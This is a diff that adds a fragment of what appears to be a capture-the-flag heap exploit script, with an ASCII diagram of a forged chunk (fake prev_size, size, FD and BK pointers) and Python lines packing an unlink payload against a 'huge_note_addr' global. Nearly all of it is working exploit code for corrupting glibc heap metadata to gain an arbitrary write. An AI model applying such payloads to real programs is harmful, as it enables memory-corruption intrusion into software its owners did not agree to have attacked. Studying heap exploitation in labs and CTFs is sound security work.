@@ -1,0 +1,36 @@
+
+'''
+chunk0                malloc返回的ptr           chunk1        malloc返回的ptr
+|                     |                        |             |
++-----------+---------+----+----+----+----+----+------+------+----+----+------+
+|           |         |fake|fake|fake|fake| D  | fake | fake |    |    |      |
+|           |         |prev|size| FD | BK | A  | prev | size&|    |    |      |
+| prev_size |size&Flag|size|    |    |    | T  | size | flag |    |    |      |
+|           |         |    |    |    |    | A  |      |      |    |    |      |
+|           |         |    |    |    |    |    |      |      |    |    |      |
++-----------+---------+----+----+----+----+----+------+------+----+----+------+
+                      |--------new_size--------|
+                      list
+
+l32(0)  +  l32(0x89)  +  l32(list-0xc) + l32(list-0x8) +"A"*(128-4*4)
+#fake_pre_szie + fake_size + fake_FD + fake_BK + DATA
+#   4bytes        4bytes     4bytes    4bytes    128-4*4
+#pre_size   +   size&flag
+l32(0x80) + l32(0x88)
+free(chunk_1)
+'''
+payload  = l64(0x0) + l64(0x30) + l64(huge_note_addr - 0x8 * 3) + l64(huge_note_addr - 0x8 * 2)
+# chunk 1 (free'd)
+payload += l64(0x20) + l64(0xa0)
+payload += 'A' * 0x90
+# chunk 2
+payload += l64(0x0) + l64(0xa1)
+payload += 'A' * 0x90
+# chunk 3 (pre_inuse should be set 0x1 to make sure chunk 2 is not free, so that chunk 2 wont be unlinked)
+payload += l64(0x0) + l64(0xa1)
+
+
+payload = l64(0x0) + l64(0x30) + l64(huge_note_addr - 0x8 * 3) + l64(huge_note_addr - 0x8 * 2)
+payload += "A"*(0x30 - len(payload))
+payload += l64(0x30) + l64(0x31)
+
